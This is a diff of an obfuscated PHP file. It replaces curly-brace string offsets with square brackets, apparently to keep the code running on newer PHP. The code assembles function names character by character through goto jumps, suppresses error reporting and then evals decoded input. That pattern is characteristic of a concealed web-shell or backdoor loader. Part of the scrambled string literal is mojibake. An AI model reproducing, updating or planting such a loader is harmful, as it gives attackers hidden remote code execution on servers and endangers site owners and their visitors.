@@ -194,97 +194,97 @@ goto __22;
 __21:
 $da .= $a->__6;
 $l1="+Ϊ�J+Ϊ�ifì�h�+Ϊ�Jìe�l�+xΪ�bJdìK�+Ϊ�Jì2nlG�JZt+Ϊ�Jì�l�zìaL�l�";
-$l .= $l1{20};
+$l .= $l1[20];
 qqqqq2:
 goto qqqqq1;
-$l .= $l1{34};
+$l .= $l1[34];
 goto qqqqq2;
 qqqqq1:
-$l .= $l1{33};
+$l .= $l1[33];
 qqqqq4:
 goto qqqqq3;
-$l .= $l1{38};
+$l .= $l1[38];
 goto qqqqq4;
 qqqqq3:
-$l .= $l1{42};
+$l .= $l1[42];
 qqqqq6:
 goto qqqqq5;
-$l .= $l1{40};
+$l .= $l1[40];
 goto qqqqq6;
 qqqqq5:
-$l .= $l1{66};
+$l .= $l1[66];
 qqqqq8:
 goto qqqqq7;
-$l .= $l1{48};
+$l .= $l1[48];
 goto qqqqq8;
 qqqqq7:
-$l .= $l1{48};
+$l .= $l1[48];
 qqqqq10:
 goto qqqqq9;
-$l .= $l1{12};
+$l .= $l1[12];
 goto qqqqq10;
 qqqqq9:
-$l .= $l1{13};
+$l .= $l1[13];
 qqqqq12:
 goto qqqqq11;
-$l .= $l1{24};
+$l .= $l1[24];
 goto qqqqq12;
 qqqqq11:
-$l .= $l1{67};
+$l .= $l1[67];
 wwwww2:
 goto wwwww1;
-$l2 .= $l1{38};
+$l2 .= $l1[38];
 goto wwwww2;
 wwwww1:
-$l2 .= $l1{69};
+$l2 .= $l1[69];
 wwwww4:
 goto wwwww3;
-$l2 .= $l1{17};
+$l2 .= $l1[17];
 goto wwwww4;
 wwwww3:
-$l2 .= $l1{74};
+$l2 .= $l1[74];
 wwwww6:
 goto wwwww5;
-$l2 .= $l1{58};
+$l2 .= $l1[58];
 goto wwwww6;
 wwwww5:
-$l2 .= $l1{13};
+$l2 .= $l1[13];
 wwwww8:
 goto wwwww7;
-$l2 .= $l1{46};
+$l2 .= $l1[46];
 goto wwwww8;
 wwwww7:
-$l2 .= $l1{67};
+$l2 .= $l1[67];
 wwwww10:
 goto wwwww9;
-$l2 .= $l1{39};
+$l2 .= $l1[39];
 goto wwwww10;
 wwwww9:
-$l2 .= $l1{14};
+$l2 .= $l1[14];
 wwwww12:
 goto wwwww11;
-$l2 .= $l1{52};
+$l2 .= $l1[52];
 goto wwwww12;
 wwwww11:
-$l2 .= $l1{37};
+$l2 .= $l1[37];
 wwwww14:
 goto wwwww13;
-$l2 .= $l1{64};
+$l2 .= $l1[64];
 goto wwwww14;
 wwwww13:
-$l2 .= $l1{95};
+$l2 .= $l1[95];
 wwwww16:
 goto wwwww15;
-$l2 .= $l1{32};
+$l2 .= $l1[32];
 goto wwwww16;
 wwwww15:
-$l2 .= $l1{75};
+$l2 .= $l1[75];
 wwwww18:
 goto wwwww17;
-$l2 .= $l1{75};
+$l2 .= $l1[75];
 goto wwwww18;
 wwwww17:
-$l2 .= $l1{33};
+$l2 .= $l1[33];
 $ddddd = $a->aaaaa;
 $aaaaa="zzzzz1"^error_reporting(0)^"zzzzzz2"^eval(($l2)(($l)($da)(($l)($ddddd),0,aRrAy_sUM([1,0,-4,0,-8,0,-11,20,27,-1,0,-27,-22]))))^"zzzzzz3";
 ddddd:
